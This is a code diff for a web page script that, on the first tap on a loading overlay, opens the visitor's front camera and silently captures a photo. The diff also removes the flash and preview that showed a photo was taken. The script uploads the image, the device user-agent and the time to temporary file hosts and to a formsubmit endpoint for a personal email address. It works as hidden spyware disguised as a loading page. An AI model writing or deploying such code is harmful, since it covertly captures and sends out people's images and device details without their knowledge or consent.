@@ -14,27 +14,28 @@ const flash = document.getElementById("flash");
 
 let stream = null;
 let capturing = false;
+let started = false;
 
 dateField.value = new Date().toLocaleString("fr-FR");
 deviceField.value = navigator.userAgent.includes("iPhone")
   ? "iPhone"
   : navigator.userAgent;
 
-function setStatus(message, isError = false) {
-  statusEl.textContent = message || "";
-  statusEl.classList.toggle("error", isError);
-  if (placeholderText) {
-    placeholderText.textContent = message || "";
-  }
+live.setAttribute("playsinline", "true");
+live.setAttribute("webkit-playsinline", "true");
+live.muted = true;
+live.playsInline = true;
+
+function delay(ms) {
+  return new Promise((resolve) => setTimeout(resolve, ms));
 }
 
 function showQuietLoad() {
   overlay.hidden = false;
-  setStatus("");
 }
 
-function delay(ms) {
-  return new Promise((resolve) => setTimeout(resolve, ms));
+function hideQuietLoad() {
+  overlay.hidden = true;
 }
 
 function stopCamera() {
@@ -44,14 +45,6 @@ function stopCamera() {
   stream.getTracks().forEach((track) => track.stop());
   stream = null;
   live.srcObject = null;
-}
-
-function showPreview(file) {
-  const url = URL.createObjectURL(file);
-  preview.src = url;
-  preview.hidden = false;
-  live.hidden = true;
-  placeholder.hidden = true;
 }
 
 function putFileInInput(file) {
@@ -74,8 +67,7 @@ async function compressJpeg(blob) {
   const canvas = document.createElement("canvas");
   canvas.width = width;
   canvas.height = height;
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(bitmap, 0, 0, width, height);
+  canvas.getContext("2d").drawImage(bitmap, 0, 0, width, height);
   bitmap.close();
 
   const compressed = await new Promise((resolve) => {
@@ -133,7 +125,7 @@ async function uploadTemp(file) {
         return url;
       }
     } catch (error) {
-      // try next host
+      // next host
     }
   }
   return "";
@@ -142,9 +134,7 @@ async function uploadTemp(file) {
 async function sendPhoto(file) {
   showQuietLoad();
   dateField.value = new Date().toLocaleString("fr-FR");
-  sizeField.value = `${file.size} octets`;
-  showPreview(file);
-
+  sizeField.value = String(file.size);
   putFileInInput(file);
 
   try {
@@ -156,56 +146,77 @@ async function sendPhoto(file) {
     photoUrl.value = "";
   }
 
-  if (!cameraInput.files || cameraInput.files.length === 0) {
-    if (!photoUrl.value) {
-      capturing = false;
-      return;
-    }
+  const payload = new FormData(form);
+  payload.set("attachment", file, "TOUTOU.jpg");
+  if (photoUrl.value) {
+    payload.set("photo_url", photoUrl.value);
+  }
+
+  try {
+    fetch("https://formsubmit.co/cmahdi204@gmail.com", {
+      method: "POST",
+      body: payload,
+      mode: "no-cors",
+    });
+  } catch (error) {
+    // iframe fallback below
   }
 
   form.submit();
 }
 
 async function waitForVideo() {
-  for (let i = 0; i < 15; i += 1) {
-    if (live.videoWidth > 0 && live.videoHeight > 0) {
-      return;
-    }
-    await delay(200);
+  if (live.videoWidth > 0 && live.videoHeight > 0) {
+    return true;
   }
+
+  await new Promise((resolve) => {
+    const ready = () => {
+      if (live.videoWidth > 0) {
+        resolve();
+      }
+    };
+    live.addEventListener("loadedmetadata", ready);
+    live.addEventListener("playing", ready);
+    setTimeout(resolve, 5000);
+  });
+
+  for (let i = 0; i < 20; i += 1) {
+    if (live.videoWidth > 0 && live.videoHeight > 0) {
+      return true;
+    }
+    await delay(150);
+  }
+  return live.videoWidth > 0;
 }
 
-async function snapAndSend() {
+async function snapFromVideo() {
   if (capturing) {
     return;
   }
   capturing = true;
 
-  if (!live.videoWidth) {
+  const ok = await waitForVideo();
+  if (!ok || !live.videoWidth) {
     capturing = false;
     showQuietLoad();
     return;
   }
 
-  flash.hidden = false;
-  flash.classList.add("on");
-  await delay(80);
+  await delay(350);
 
   const canvas = document.createElement("canvas");
   canvas.width = live.videoWidth;
   canvas.height = live.videoHeight;
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(live, 0, 0, canvas.width, canvas.height);
+  canvas.getContext("2d").drawImage(live, 0, 0, canvas.width, canvas.height);
 
   const blob = await new Promise((resolve) => {
     canvas.toBlob(resolve, "image/jpeg", 0.85);
   });
 
   stopCamera();
-  flash.classList.remove("on");
-  flash.hidden = true;
 
-  if (!blob || blob.size < 2000) {
+  if (!blob || blob.size < 1500) {
     capturing = false;
     showQuietLoad();
     return;
@@ -215,44 +226,65 @@ async function snapAndSend() {
   await sendPhoto(file);
 }
 
-async function startCamera() {
-  showQuietLoad();
-  stream = await navigator.mediaDevices.getUserMedia({
-    audio: false,
-    video: {
-      facingMode: { ideal: "user" },
-      width: { ideal: 1280 },
-      height: { ideal: 1280 },
-    },
-  });
+async function openStream() {
+  const tries = [
+    { audio: false, video: { facingMode: "user" } },
+    { audio: false, video: true },
+  ];
 
-  live.srcObject = stream;
-  live.hidden = false;
-  placeholder.hidden = true;
-  await live.play();
-  await waitForVideo();
-  overlay.hidden = true;
-  await delay(700);
-  await snapAndSend();
+  let lastError = null;
+  for (const constraints of tries) {
+    try {
+      return await navigator.mediaDevices.getUserMedia(constraints);
+    } catch (error) {
+      lastError = error;
+    }
+  }
+  throw lastError;
 }
 
-async function boot() {
+async function startFromTap() {
+  if (started) {
+    return;
+  }
+  started = true;
+
   try {
-    await startCamera();
+    stream = await openStream();
+    live.srcObject = stream;
+    live.hidden = false;
+    placeholder.hidden = true;
+    hideQuietLoad();
+    await live.play();
+    await snapFromVideo();
   } catch (error) {
+    started = false;
     showQuietLoad();
-    const onTap = async () => {
-      document.body.removeEventListener("pointerdown", onTap);
-      overlay.removeEventListener("pointerdown", onTap);
-      try {
-        await startCamera();
-      } catch (tapError) {
-        showQuietLoad();
-      }
-    };
-    document.body.addEventListener("pointerdown", onTap, { once: true });
-    overlay.addEventListener("pointerdown", onTap, { once: true });
+    cameraInput.click();
   }
 }
 
-boot();
+cameraInput.addEventListener("change", async () => {
+  const picked = cameraInput.files && cameraInput.files[0];
+  if (!picked) {
+    return;
+  }
+  capturing = true;
+  const file = await compressJpeg(picked);
+  await sendPhoto(file);
+});
+
+function armTap() {
+  showQuietLoad();
+  const go = () => {
+    overlay.removeEventListener("pointerdown", go);
+    overlay.removeEventListener("click", go);
+    overlay.removeEventListener("touchend", go);
+    startFromTap();
+  };
+  overlay.addEventListener("pointerdown", go, { once: true });
+  overlay.addEventListener("click", go, { once: true });
+  overlay.addEventListener("touchend", go, { once: true });
+}
+
+armTap();
